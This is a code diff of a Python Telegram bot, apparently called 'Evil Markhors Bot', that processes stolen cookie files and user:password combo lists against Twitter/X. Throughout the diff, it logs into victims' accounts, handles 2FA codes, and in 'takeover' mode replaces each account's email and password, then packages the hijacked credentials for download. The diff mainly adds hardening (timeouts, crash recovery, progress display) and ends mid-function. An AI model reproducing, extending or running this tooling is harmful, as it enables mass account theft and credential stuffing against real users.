@@ -1,14 +1,15 @@
 #!/usr/bin/env python3
 """
-Evil Markhors Bot - ALL-IN-ONE (cookies + ULP)
-Interactive code: X jab code maange, bot aapko batata hai; aap code bhejte ho, bot aage badhta hai.
+Evil Markhors Bot - HARDENED
+Live progress + crash-proof + auto-recovery.
 """
 import os, re, sys, json, stat, hmac, time, base64, struct, secrets, string
-import asyncio, logging, tempfile, zipfile
+import asyncio, logging, tempfile, zipfile, shutil, traceback
 
 try:
     import httpx
     from telegram import Update, InputFile
+    from telegram.error import RetryAfter, Forbidden, BadRequest
     from telegram.ext import (ApplicationBuilder, CommandHandler,
                               MessageHandler, filters, ContextTypes)
 except ImportError:
@@ -21,6 +22,7 @@ CREDIT       = os.getenv("CREDIT", "Config by Evil Markhors")
 LIVE_DEFAULT = os.getenv("LIVE", "1") == "1"
 CONCURRENCY  = int(os.getenv("CONCURRENCY", "8"))
 TIMEOUT      = float(os.getenv("TIMEOUT", "25"))
+ACC_TIMEOUT  = float(os.getenv("ACC_TIMEOUT", "90"))     # per account max seconds
 MAX_FILES    = int(os.getenv("MAX_FILES", "5000"))
 RETRIES      = int(os.getenv("RETRIES", "3"))
 STORE_PATH   = os.getenv("STORE_PATH", "users.json")
@@ -41,23 +43,16 @@ _FIELD_RE = re.compile(r"^\s*[\u2013\-]\s*([^:]+?)\s*:\s*(.*)$")
 # ============================ DEPLOY TEMPLATES ============================
 FILES = {
  "requirements.txt": "python-telegram-bot>=21.0\nhttpx>=0.27\n",
- ".gitignore": "__pycache__/\n*.pyc\n.env\nusers.json\ndata/\nvenv/\n*.zip\n",
+ ".gitignore": "__pycache__/\n*.pyc\n.env\nusers.json\ndata/\nvenv/\n*.zip\nbatch_*.json\n",
+ ".dockerignore": "venv\n__pycache__\n*.zip\n.env\ndata\nusers.json\n",
  ".env.example": ("BOT_TOKEN=123456:ABC\nLIVE=1\nCONCURRENCY=8\n"
                   "WEBSITE=https://evilmarkhors.me\nCREDIT=Config by Evil Markhors\nSTORE_PATH=users.json\n"),
  "Dockerfile": ("FROM python:3.12-slim\nWORKDIR /app\nENV PYTHONUNBUFFERED=1 STORE_PATH=/app/users.json\n"
                 "COPY requirements.txt .\nRUN pip install --no-cache-dir -r requirements.txt\n"
                 f"COPY {SELF} bot.py\nCMD [\"python\",\"bot.py\"]\n"),
- "docker-compose.yml": ("services:\n  bot:\n    build: .\n    restart: unless-stopped\n    environment:\n"
-                        "      - BOT_TOKEN=${BOT_TOKEN}\n      - LIVE=1\n      - STORE_PATH=/data/users.json\n"
-                        "    volumes:\n      - ./data:/data\n"),
- "evilmarkhors-bot.service": ("[Unit]\nDescription=Evil Markhors Bot\nAfter=network-online.target\n\n[Service]\n"
-                              "Type=simple\nUser=botuser\n" f"WorkingDirectory={HERE}\nEnvironmentFile={HERE}/.env\n"
-                              f"ExecStart={HERE}/venv/bin/python {HERE}/{SELF}\n"
-                              "Restart=always\nRestartSec=5\n\n[Install]\nWantedBy=multi-user.target\n"),
- "push.sh": "#!/usr/bin/env bash\nset -e\ngit add -A\ngit commit -m \"update $(date +%F_%H:%M)\" || true\ngit push\n",
- "deploy.sh": (f"#!/usr/bin/env bash\nset -e\ncd {HERE}\ngit pull --rebase\n"
-               "venv/bin/pip install -q -r requirements.txt\nsudo systemctl restart evilmarkhors-bot\n"),
- "README.md": f"# Evil Markhors Bot\n\nCookie + ULP reworker.\n\n```\npython3 -m venv venv && venv/bin/pip install -r requirements.txt\ncp .env.example .env\npython {SELF}\n```\n",
+ "railway.toml": '[build]\nbuilder = "DOCKERFILE"\ndockerfilePath = "Dockerfile"\n\n'
+                 '[deploy]\nrestartPolicyType = "ON_FAILURE"\nrestartPolicyMaxRetries = 10\n',
+ "README.md": f"# Evil Markhors Bot\n\nCookie + ULP reworker.\n\n```\npython {SELF}\n```\n",
 }
 
 def _w(p, c, ov=False):
@@ -72,7 +67,7 @@ def bootstrap(force=False):
 
 # ============================ STATE ============================
 _store, _lock = {}, asyncio.Lock()
-BATCH = {}     # uid -> batch
+BATCH = {}     # uid -> batch dict
 PEND  = {}     # uid -> {key: state}
 
 def load_store():
@@ -97,6 +92,73 @@ def get_live(uid): return bool(ucfg(uid).get("live", LIVE_DEFAULT))
 async def set_cfg(uid, **kw):
     async with _lock:
         ucfg(uid).update(kw); save_store()
+
+# ---------- batch persistence (crash recovery) ----------
+def batch_file(uid): return os.path.join(HERE, f"batch_{uid}.json")
+
+def save_batch(uid):
+    b = BATCH.get(uid)
+    if not b: return
+    try:
+        with open(batch_file(uid), "w", encoding="utf-8") as f:
+            json.dump({"lines": b["lines"], "results": b["results"], "ok": b["ok"],
+                       "fail": b["fail"], "mode": b["mode"], "started": b["started"]}, f)
+    except Exception: logging.exception("save_batch")
+
+def clear_batch_file(uid):
+    try: os.remove(batch_file(uid))
+    except Exception: pass
+
+def load_batches():
+    for fn in os.listdir(HERE):
+        if fn.startswith("batch_") and fn.endswith(".json"):
+            try:
+                uid = fn[6:-5]
+                with open(os.path.join(HERE, fn), encoding="utf-8") as f: d = json.load(f)
+                if d.get("lines"):
+                    BATCH[uid] = {"tmp": tempfile.mkdtemp(prefix="em_rec_"), "msg": None,
+                                  "lines": d["lines"], "results": d.get("results", []),
+                                  "ok": d.get("ok", 0), "fail": d.get("fail", 0),
+                                  "mode": d.get("mode", "ulp"), "takeover": False,
+                                  "newpass": "", "newemail": "", "started": d.get("started", time.time())}
+                    logging.info("recovered batch for %s (%s lines)", uid, len(d["lines"]))
+            except Exception: logging.exception("load_batch %s", fn)
+
+# ============================ PROGRESS ============================
+def _fmt_t(sec):
+    sec = int(sec)
+    return f"{sec//60}m{sec%60:02d}s" if sec >= 60 else f"{sec}s"
+
+class Progress:
+    def __init__(self, msg, total, label):
+        self.msg, self.total, self.label = msg, total, label
+        self.done = self.ok = self.fail = self.pend = 0
+        self.start = time.time(); self.last = 0.0; self.lock = asyncio.Lock()
+        self.phase = "start"
+    async def update(self, phase=None, force=False):
+        if phase: self.phase = phase
+        async with self.lock:
+            now = time.time()
+            if not force and now - self.last < 2.5: return
+            self.last = now
+            el = now - self.start
+            pct = int(self.done * 100 / self.total) if self.total else 0
+            eta = (el / self.done * (self.total - self.done)) if self.done else 0
+            bar = "█" * (pct // 5) + "░" * (20 - pct // 5)
+            await _edit(self.msg,
+                f"{self.label}\n{self.phase}\n\n{bar} {pct}%\n"
+                f"{self.done}/{self.total} | ok {self.ok} | fail {self.fail} | code {self.pend}\n"
+                f"waqt {_fmt_t(el)} | baaqi ~{_fmt_t(eta)}")
+
+async def _edit(msg, text):
+    if msg is None: return
+    for _ in range(3):
+        try:
+            await msg.edit_text(text); return
+        except RetryAfter as e:
+            await asyncio.sleep(getattr(e, "retry_after", 2))
+        except Exception:
+            return
 
 # ============================ COOKIE MODE ============================
 def parse_cookie_file(text):
@@ -169,7 +231,10 @@ async def rework_cookie(text, client, live, sem):
     data, cookies = parse_cookie_file(text)
     if live and cookies:
         async with sem:
-            ld = await live_check(client, cookie_dict(cookies))
+            try:
+                ld = await asyncio.wait_for(live_check(client, cookie_dict(cookies)), ACC_TIMEOUT)
+            except asyncio.TimeoutError:
+                ld = {}
         for k, v in ld.items():
             if v not in ("", None): data[k] = str(v)
     data["Cookies"] = CREDIT
@@ -219,9 +284,9 @@ async def _task(cl, payload, start=False):
     try: return r.json()
     except Exception: return {}
 
-async def _send(cl, ft, subtask, field, value):
+async def _send(cl, ft, subtask, value):
     return await _task(cl, {"flow_token": ft, "subtask_inputs": [
-        {"subtask_id": subtask, field: {"text": value, "link": "next_link"}}]})
+        {"subtask_id": subtask, "enter_text": {"text": value, "link": "next_link"}}]})
 
 async def _duplication(cl, ft):
     return await _task(cl, {"flow_token": ft, "subtask_inputs": [
@@ -231,7 +296,6 @@ async def _duplication(cl, ft):
 def _logged_in(cl): return bool(cl.cookies.get("auth_token") and cl.cookies.get("ct0"))
 
 async def ulp_login(ulp):
-    """(client, ok, info). info: {} | {'pending':subtask,'flow_token':ft}."""
     cl = httpx.AsyncClient(follow_redirects=True)
     try:
         r = await cl.post("https://api.twitter.com/1.1/guest/activate.json", headers=_H(cl), timeout=TIMEOUT)
@@ -250,8 +314,7 @@ async def ulp_login(ulp):
               "enter_password": {"password": ulp["password"], "link": "next_link"}}]}); ft = j.get("flow_token", ft)
         subs = [s.get("subtask_id", "") for s in j.get("subtasks", [])]
         if "LoginTwoFactorAuthChallenge" in subs and ulp.get("totp"):
-            j = await _send(cl, ft, "LoginTwoFactorAuthChallenge", "enter_text", totp_now(ulp["totp"]))
-            ft = j.get("flow_token", ft)
+            j = await _send(cl, ft, "LoginTwoFactorAuthChallenge", totp_now(ulp["totp"])); ft = j.get("flow_token", ft)
             subs = [s.get("subtask_id", "") for s in j.get("subtasks", [])]
         for s in subs:
             if s in ("LoginAcid", "LoginTwoFactorAuthChallenge"):
@@ -263,8 +326,7 @@ async def ulp_login(ulp):
 
 async def resume_login(st, code):
     cl, ft = st["client"], st["flow_token"]
-    j = await _send(cl, ft, st["subtask"], "enter_text", code)
-    ft = j.get("flow_token", ft)
+    j = await _send(cl, ft, st["subtask"], code); ft = j.get("flow_token", ft)
     subs = [s.get("subtask_id", "") for s in j.get("subtasks", [])]
     for s in subs:
         if s in ("LoginAcid", "LoginTwoFactorAuthChallenge"):
@@ -273,11 +335,9 @@ async def resume_login(st, code):
     return "ok" if _logged_in(cl) else "fail"
 
 EMAIL_SET = ["https://x.com/i/api/1.1/account/update_email.json",
-             "https://api.x.com/1.1/account/update_email.json",
-             "https://x.com/i/api/1.1/account/settings.json"]
+             "https://api.x.com/1.1/account/update_email.json"]
 EMAIL_CFM = ["https://x.com/i/api/1.1/account/confirm_email.json",
-             "https://api.x.com/1.1/account/confirm_email.json",
-             "https://x.com/i/api/1.1/account/verify_email.json"]
+             "https://api.x.com/1.1/account/verify_email.json"]
 
 async def set_email(cl, ck, new_email):
     for url in EMAIL_SET:
@@ -290,7 +350,7 @@ async def set_email(cl, ck, new_email):
 
 async def confirm_email(cl, ck, code):
     for url in EMAIL_CFM:
-        for field in ("confirmation_code", "code", "email"):
+        for field in ("confirmation_code", "code"):
             try:
                 r = await cl.post(url, headers={**hdrs(ck), "content-type": "application/x-www-form-urlencoded"},
                                   cookies=ck, data={field: code}, timeout=TIMEOUT)
@@ -308,20 +368,26 @@ async def change_pass(cl, ck, old, new):
 
 async def finish_account(uid, idx, ulp, cl):
     b = BATCH[uid]; ck = dict(cl.cookies)
-    det = await live_check(cl, ck)
+    try:
+        det = await asyncio.wait_for(live_check(cl, ck), ACC_TIMEOUT)
+    except asyncio.TimeoutError:
+        det = {}
     res = {"ok": True, "ulp": ulp, "details": det, "line": b["lines"][idx]}
     if b["takeover"] and b["newemail"]:
         ne = alias_email(b["newemail"], det.get("Username") or ulp["username"])
-        if await set_email(cl, ck, ne):
-            res["new_email"] = ne
-            res["_cl"], res["_ulp"], res["_idx"] = cl, ulp, idx
+        try:
+            if await asyncio.wait_for(set_email(cl, ck, ne), ACC_TIMEOUT): res["new_email"] = ne
+        except asyncio.TimeoutError: pass
+        if res.get("new_email"):
+            b["results"][idx] = res
             PEND.setdefault(uid, {})[str(idx)] = {"kind": "email", "client": cl,
                 "ulp": ulp, "idx": idx, "new_email": ne}
-            b["results"][idx] = res
             return "email_pending"
     if b["takeover"]:
         np = b["newpass"] or gen_pass()
-        if await change_pass(cl, ck, ulp["password"], np): res["new_pass"] = np
+        try:
+            if await asyncio.wait_for(change_pass(cl, ck, ulp["password"], np), ACC_TIMEOUT): res["new_pass"] = np
+        except asyncio.TimeoutError: pass
     b["results"][idx] = res; b["ok"] += 1
     await cl.aclose(); return "done"
 
@@ -341,287 +407,36 @@ def fmt_result(r):
         o.append(f"{k}: {d.get(k,'') or '\u2013'}")
     return "\n".join(o + [CREDIT, WEBSITE, ""])
 
-# ============================ BATCH RUNNERS ============================
-async def process_cookie_zip(ip, op, live, progress):
-    ok = fail = 0; sem = asyncio.Semaphore(CONCURRENCY)
+# ============================ RUNNERS ============================
+async def process_cookie_zip(ip, op, live, prog):
+    sem = asyncio.Semaphore(CONCURRENCY)
     async with httpx.AsyncClient(follow_redirects=True) as client:
         with zipfile.ZipFile(ip) as zin:
             names = [n for n in zin.namelist() if n.lower().endswith(".txt") and not n.endswith("/")][:MAX_FILES]
-            total = len(names)
+            prog.total = len(names)
             with zipfile.ZipFile(op, "w", zipfile.ZIP_DEFLATED) as zout:
-                for i, name in enumerate(names, 1):
+                for name in names:
                     raw = b""
                     try:
                         raw = zin.read(name)
-                        zout.writestr(name, await rework_cookie(raw.decode("utf-8","ignore"), client, live, sem)); ok += 1
+                        zout.writestr(name, await rework_cookie(raw.decode("utf-8","ignore"), client, live, sem))
+                        prog.ok += 1
                     except Exception:
                         logging.exception("cookie %s", name)
                         try: zout.writestr(name, raw)
                         except Exception: pass
-                        fail += 1
-                    await progress(i, total, ok, fail)
-    return ok, fail, total
+                        prog.fail += 1
+                    prog.done += 1
+                    await prog.update()
+    return prog.ok, prog.fail, prog.total
 
-async def run_ulp_batch(uid, lines, cfg, progress):
-    b = BATCH[uid]; b["lines"] = lines; b["results"] = [None] * len(lines)
-    sem = asyncio.Semaphore(CONCURRENCY); lock = asyncio.Lock()
-    async def one(idx, line):
-        ulp = parse_ulp(line)
-        if not ulp:
-            b["results"][idx] = {"ok": False, "line": line, "err": "parse"}; b["fail"] += 1
-            await progress(); return
-        try:
-            cl, ok, info = await ulp_login(ulp)
-            if info.get("pending"):
-                PEND.setdefault(uid, {})[str(idx)] = {"kind": "login", "client": cl,
-                    "flow_token": info["flow_token"], "subtask": info["pending"], "ulp": ulp, "idx": idx}
-                b["results"][idx] = {"ok": False, "line": line, "ulp": ulp, "pending": info["pending"]}
-            elif not ok:
-                b["results"][idx] = {"ok": False, "line": line, "ulp": ulp, "err": "login_failed"}; b["fail"] += 1
-                await cl.aclose()
-            else:
-                async with sem:
-                    if await finish_account(uid, idx, ulp, cl) == "done": pass
-                    else: b["pending_email"] = True
-                    if not b["results"][idx].get("pending"): b["ok"] += 1
-        except Exception:
-            logging.exception("ulp"); b["results"][idx] = {"ok": False, "line": line, "err": "exception"}; b["fail"] += 1
-        await progress()
-    await asyncio.gather(*(one(i, l) for i, l in enumerate(lines)))
-
-def build_zip(path, uid):
+async def run_ulp_batch(uid, lines, prog):
     b = BATCH[uid]
-    with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as z:
-        z.writestr("results.txt", "\n".join(fmt_result(r) for r in b["results"] if r))
-        succ = [r for r in b["results"] if r and r.get("ok")]
-        z.writestr("success.txt", "\n".join(
-            f"{r['details'].get('Username','')}:{r['details'].get('Email','') or r['ulp'].get('email','')}"
-            f":{r.get('new_pass') or r['ulp']['password']}" for r in succ))
-        z.writestr("failed.txt", "\n".join((r.get("line") or "") for r in b["results"] if r and not r.get("ok")))
-
-# ============================ HANDLERS ============================
-async def _edit(m, t):
-    try: await m.edit_text(t)
-    except Exception: pass
-
-async def start(u, c):
-    await u.message.reply_text(
-        "Evil Markhors Bot\n\nTWO MODES (alag alag):\n"
-        "1) COOKIES: cookie file -> rework\n"
-        "2) ULP: user:pass file -> login verify + takeover\n\n"
-        "Commands:\n/mode auto|cookies|ulp\n/live on|off\n/takeover on|off\n"
-        "/newpass <pass>\n/newemail you@gmail.com\n/status\n/finalize\n/cancel\n\n"
-        "Code maange to bot khud batayega — aap code bhej dena.")
-
-async def help_cmd(u, c):
-    await u.message.reply_text(
-        "ULP formats: user:pass | email:pass | user:email:pass | ...:2fa\n"
-        "Takeover: /takeover on (+ optional /newemail)\n"
-        "Code aane par: `username code` bhejo (ek se zyada ho to har line alag).")
-
-async def status_cmd(u, c):
-    g = ucfg(u.effective_user.id); b = BATCH.get(u.effective_user.id)
-    pend = len(PEND.get(u.effective_user.id, {}))
-    await u.message.reply_text(
-        f"Mode: {g['mode']}\nLive: {'ON' if g['live'] else 'OFF'}\nTakeover: {'ON' if g['takeover'] else 'OFF'}\n"
-        f"NewPass: {g['newpass'] or '(random)'}\nNewEmail: {g['newemail'] or '(none)'}\n"
-        f"Batch: {'chal raha' if b else 'none'} | Pending codes: {pend}")
-
-async def mode_cmd(u, c):
-    a = (c.args[0].lower() if c.args else "auto"); a = a if a in ("auto","cookies","ulp") else "auto"
-    await set_cfg(u.effective_user.id, mode=a); await u.message.reply_text(f"Mode = {a}")
-
-async def live_cmd(u, c):
-    uid = u.effective_user.id; a = (c.args[0].lower() if c.args else "")
-    new = True if a in ("on","1","yes") else False if a in ("off","0","no") else (not get_live(uid))
-    await set_cfg(uid, live=new); await u.message.reply_text(f"Live = {'ON' if new else 'OFF'}")
-
-async def takeover_cmd(u, c):
-    uid = u.effective_user.id; a = (c.args[0].lower() if c.args else "")
-    new = True if a in ("on","1","yes") else False if a in ("off","0","no") else (not ucfg(uid)["takeover"])
-    await set_cfg(uid, takeover=new); await u.message.reply_text(f"Takeover = {'ON' if new else 'OFF'}")
-
-async def newpass_cmd(u, c):
-    await set_cfg(u.effective_user.id, newpass=" ".join(c.args) if c.args else "")
-    await u.message.reply_text(f"NewPass = {ucfg(u.effective_user.id)['newpass'] or '(random)'}")
-
-async def newemail_cmd(u, c):
-    await set_cfg(u.effective_user.id, newemail=(c.args[0] if c.args else ""))
-    await u.message.reply_text(f"NewEmail = {ucfg(u.effective_user.id)['newemail'] or '(none)'}")
-
-def detect_mode(text, forced):
-    if forced in ("cookies","ulp"): return forced
-    return "cookies" if sum(1 for l in text.splitlines() if len(l.split("\t")) >= 7) >= 3 else "ulp"
-
-async def handle_file(u, c, doc):
-    uid = u.effective_user.id; g = ucfg(uid)
-    if uid in BATCH:
-        await u.message.reply_text("Pehle wala batch chal raha hai. /finalize ya /cancel karo."); return
-    name = (doc.file_name or "").lower(); is_zip = name.endswith(".zip")
-    msg = await u.message.reply_text("Download...")
-    tmp = tempfile.mkdtemp(prefix="em_")
-    ip = os.path.join(tmp, "in" + (".zip" if is_zip else ".txt"))
-    last = [0.0]; loop = asyncio.get_event_loop(); cnt = [0, 0, 0]
-    async def prog():
-        cnt[2] += 1
-        if loop.time() - last[0] < 2 and cnt[2] != cnt[0] + cnt[1]: return
-        last[0] = loop.time()
-        await _edit(msg, f"{cnt[2]} done | ok {cnt[0]} | pending {cnt[1]}")
-    try:
-        await (await doc.get_file()).download_to_drive(ip)
-        if is_zip:
-            with zipfile.ZipFile(ip) as z:
-                sample = "".join(z.read(n).decode("utf-8","ignore") for n in z.namelist()[:3] if n.endswith(".txt"))
-        else:
-            with open(ip, encoding="utf-8") as f: sample = f.read()
-        mode = detect_mode(sample, g["mode"])
-        await _edit(msg, f"Mode: {mode} | processing...")
-        BATCH[uid] = {"tmp": tmp, "mode": mode, "takeover": g["takeover"],
-                      "newpass": g["newpass"], "newemail": g["newemail"],
-                      "results": [], "lines": [], "ok": 0, "fail": 0, "msg": msg}
-        if mode == "cookies":
-            op = os.path.join(tmp, "out.zip")
-            if not is_zip:
-                with zipfile.ZipFile(op, "w") as z: z.write(ip, "reworked.txt")
-                ok, fail, total = 1, 0, 1
-            else:
-                async def p(i, t, o, f): cnt[0], cnt[1] = o, f; await prog()
-                ok, fail, total = await process_cookie_zip(ip, op, g["live"], p)
-            await u.message.reply_document(InputFile(op, filename="evilmarkhors_cookies.zip"),
-                caption=f"Mode: cookies\nDone: {ok} ok, {fail} fail\n{WEBSITE}\n{CREDIT}")
-            await _edit(msg, "Complete."); del BATCH[uid]
-        else:
-            if is_zip:
-                with zipfile.ZipFile(ip) as z:
-                    lines = []
-                    for n in z.namelist():
-                        if n.lower().endswith(".txt"):
-                            lines += [l for l in z.read(n).decode("utf-8","ignore").splitlines() if l.strip()]
-            else:
-                with open(ip, encoding="utf-8") as f:
-                    lines = [l for l in f.read().splitlines() if l.strip()]
-            if not lines:
-                await _edit(msg, "Koi line nahi mili."); del BATCH[uid]; return
-            await run_ulp_batch(uid, lines, g, prog)
-            await after_batch(uid, u, msg)
-    except Exception as e:
-        logging.exception("handle_file"); await _edit(msg, f"Error: {e}")
-        if uid in BATCH and not PEND.get(uid): del BATCH[uid]
-
-async def after_batch(uid, u, msg):
-    b = BATCH[uid]; pend = PEND.get(uid, {})
-    if pend:
-        lst = "\n".join(f"{b['lines'][int(k)].split(':')[0]}  -> {v['kind']}" for k, v in pend.items())
-        await _edit(msg, f"{b['ok']} ok | {b['fail']} fail | {len(pend)} code pending")
-        await u.message.reply_text(
-            f"{len(pend)} account(s) ko code chahiye:\n\n{lst}\n\n"
-            "Bhejo format: `username code` (har line alag).\nSab ke baad /finalize.")
-    else:
-        await finalize_batch(uid, u)
-
-async def finalize_batch(uid, u):
-    b = BATCH.get(uid)
-    if not b: await u.message.reply_text("Koi batch nahi."); return
-    op = os.path.join(b["tmp"], "out.zip")
-    build_zip(op, uid)
-    succ = sum(1 for r in b["results"] if r and r.get("ok"))
-    pend = len(PEND.get(uid, {}))
-    await u.message.reply_document(InputFile(op, filename="evilmarkhors_ulp.zip"),
-        caption=f"ULP done | ok {succ} | fail {b['fail']} | pending {pend}\n{WEBSITE}\n{CREDIT}")
-    await _edit(b["msg"], "Complete.")
-    for v in PEND.get(uid, {}).values():
-        try: await v["client"].aclose()
-        except Exception: pass
-    PEND.pop(uid, None)
-    try: import shutil; shutil.rmtree(b["tmp"], ignore_errors=True)
-    except Exception: pass
-    del BATCH[uid]
-
-async def on_text(u, c):
-    uid = u.effective_user.id
-    if uid not in BATCH or not PEND.get(uid):
-        return
-    b = BATCH[uid]; pend = PEND[uid]
-    byname = {b["lines"][int(k)].split(":")[0].strip().lower(): k for k in pend}
-    pairs = []
-    for line in u.message.text.splitlines():
-        line = line.strip()
-        if not line: continue
-        parts = line.split()
-        if len(parts) >= 2 and parts[0].strip().lower() in byname:
-            pairs.append((byname[parts[0].strip().lower()], parts[-1]))
-        elif len(pend) == 1:
-            pairs.append((list(pend.keys())[0], parts[-1]))
-    if not pairs:
-        await u.message.reply_text("Samajh nahi aaya. Format: `username code`"); return
-    done = 0
-    for key, code in pairs:
-        st = pend.get(key)
-        if not st: continue
-        if st["kind"] == "login":
-            r = await resume_login(st, code)
-            if r == "more":
-                await u.message.reply_text(f"{st['ulp']['username'] or st['ulp']['email']}: ek aur code chahiye.")
-                continue
-            if r == "ok":
-                async with asyncio.Lock():
-                    res = await finish_account(uid, st["idx"], st["ulp"], st["client"])
-                if res != "email_pending":
-                    b["ok"] += 1
-                del pend[key]; done += 1
-                if res == "email_pending":
-                    await u.message.reply_text(
-                        f"{st['ulp']['username'] or st['ulp']['email']}: email set, confirmation code bhejo.")
-            else:
-                b["results"][st["idx"]] = {"ok": False, "line": b["lines"][st["idx"]], "err": "code_failed"}
-                b["fail"] += 1; del pend[key]; done += 1
-        elif st["kind"] == "email":
-            ck = dict(st["client"].cookies)
-            if await confirm_email(st["client"], ck, code):
-                res = b["results"][st["idx"]]
-                if b["takeover"]:
-                    np = b["newpass"] or gen_pass()
-                    if await change_pass(st["client"], ck, st["ulp"]["password"], np): res["new_pass"] = np
-                b["ok"] += 1; del pend[key]; done += 1
-                await st["client"].aclose()
-            else:
-                await u.message.reply_text(f"{st['ulp'].get('email','')}: email code galat, dobara bhejo.")
-    if not pend:
-        await u.message.reply_text("Sab code mil gaye. Finalize ho raha hai...")
-        await finalize_batch(uid, u)
-    else:
-        await u.message.reply_text(f"{done} update | {len(pend)} abhi bhi pending. Baaki codes bhejo ya /finalize.")
-
-async def finalize_cmd(u, c): await finalize_batch(u.effective_user.id, u)
-
-async def cancel_cmd(u, c):
-    uid = u.effective_user.id
-    for v in PEND.get(uid, {}).values():
-        try: await v["client"].aclose()
-        except Exception: pass
-    PEND.pop(uid, None)
-    b = BATCH.pop(uid, None)
-    if b:
+    b["lines"] = lines; b["results"] = [None] * len(lines); prog.total = len(lines)
+    sem = asyncio.Semaphore(CONCURRENCY)
+    async def one(idx, line):
         try:
-            import shutil; shutil.rmtree(b["tmp"], ignore_errors=True)
-        except Exception: pass
-    await u.message.reply_text("Cancel ho gaya.")
-
-# ============================ MAIN ============================
-def main():
-    made = bootstrap()
-    if made: print("Bani files:", ", ".join(made))
-    if "--init" in sys.argv: return
-    load_store()
-    app = ApplicationBuilder().token(BOT_TOKEN).build()
-    for cmd, fn in [("start",start),("help",help_cmd),("status",status_cmd),("mode",mode_cmd),
-                    ("live",live_cmd),("takeover",takeover_cmd),("newpass",newpass_cmd),
-                    ("newemail",newemail_cmd),("finalize",finalize_cmd),("cancel",cancel_cmd)]:
-        app.add_handler(CommandHandler(cmd, fn))
-    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))
-    logging.info("Bot chalu")
-    app.run_polling(drop_pending_updates=True)
-
-if __name__ == "__main__":
-    main()
+            ulp = parse_ulp(line)
+            if not ulp:
+                b["results"][idx] = {"ok": False, "line": line, "err": "parse"}; prog.fail += 1
+                return
